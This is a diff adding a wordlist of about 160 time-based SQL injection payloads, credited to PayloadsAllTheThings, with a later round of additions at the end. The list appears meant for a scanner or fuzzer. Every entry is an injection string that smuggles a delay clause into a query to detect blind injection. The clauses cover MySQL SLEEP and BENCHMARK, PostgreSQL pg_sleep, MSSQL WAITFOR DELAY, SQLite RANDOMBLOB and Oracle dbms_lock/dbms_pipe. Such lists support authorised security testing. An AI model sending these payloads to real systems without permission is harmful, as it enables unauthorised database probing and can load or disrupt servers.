@@ -1,0 +1,148 @@
+# SQL Injection Time-Based payloads
+# Source: https://github.com/swisskyrepo/PayloadsAllTheThings
+# Total: 143 payloads
+' AND SLEEP(5)-- -
+' AND SLEEP(5)#
+' AND SLEEP(5)/*
+" AND SLEEP(5)-- -
+1 AND SLEEP(5)-- -
+1) AND SLEEP(5)-- -
+') AND SLEEP(5)-- -
+'; SELECT SLEEP(5)-- -
+'; SELECT pg_sleep(5)-- -
+'; SELECT pg_sleep(5);--
+1; SELECT pg_sleep(5)--
+' AND (SELECT SLEEP(5))-- -
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5';--
+1; WAITFOR DELAY '0:0:5'--
+' AND randomblob(500000000/1)--
+1 AND randomblob(500000000/1)--
+' OR SLEEP(5)-- -
+" OR SLEEP(5)-- -
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+||pg_sleep(5)--
+1||pg_sleep(5)--
+"||pg_sleep(5)--
+'||pg_sleep(5)--
+1)||pg_sleep(5)--
+")||pg_sleep(5)--
+')||pg_sleep(5)--
+1))||pg_sleep(5)--
+"))||pg_sleep(5)--
+'))||pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+
+# ── Round-2 additions (2026-10-29): modern/unique payloads, deduped vs existing ──
+' AND SLEEP(2)-- -
+' AND SLEEP(2.5)-- -
+' AND SLEEP(3)-- -
+" AND SLEEP(2)-- -
+1 AND SLEEP(2)-- -
+1) AND SLEEP(3)-- -
+') AND SLEEP(2)-- -
+'; SELECT SLEEP(2)-- -
+' OR SLEEP(3)-- -
+' AND (SELECT SLEEP(2))-- -
+' AND (SELECT * FROM (SELECT(SLEEP(3)))notscan)-- -
+'; SELECT pg_sleep(2);--
+'; SELECT pg_sleep(3)-- -
+'; SELECT pg_sleep(2.5);--
+'; WAITFOR DELAY '0:0:2'-- -
+'; WAITFOR DELAY '0:0:3'--
+1; WAITFOR DELAY '0:0:2'--
+'; SELECT dbms_pipe.receive_message(('notscan'),3) FROM dual--
+' AND dbms_lock.sleep(2)=1-- -
